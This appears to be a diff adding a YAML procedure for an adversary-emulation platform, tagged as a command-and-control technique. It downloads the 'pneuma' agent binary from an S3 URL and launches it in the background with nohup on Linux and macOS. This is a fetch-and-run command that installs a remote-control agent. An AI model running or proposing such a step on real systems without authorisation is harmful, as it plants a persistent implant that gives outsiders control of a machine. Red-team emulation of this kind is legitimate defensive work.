@@ -1,0 +1,25 @@
+id: 5f9001dc-e179-451f-bbd1-9fb4466d7057
+metadata:
+  version: 1
+  authors:
+    - privateducky
+  tags: []
+name: Download pneuma
+description: |
+  pneuma is an open-source agent which accompanies the Prelude platform. This procedure downloads the agent to disk
+  and starts it in the background
+tactic: command-and-control
+technique:
+  id: T1544
+  name: Remote File Copy
+platforms:
+  linux:
+    sh:
+      command: |
+        chmod +x pneuma-linux && nohup ./pneuma-linux &
+      payload: https://s3.amazonaws.com/operator.payloads/pneuma/pneuma-linux
+  darwin:
+    sh:
+      command: |
+        chmod +x pneuma-darwin && nohup ./pneuma-darwin &
+      payload: https://s3.amazonaws.com/operator.payloads/pneuma/pneuma-darwin
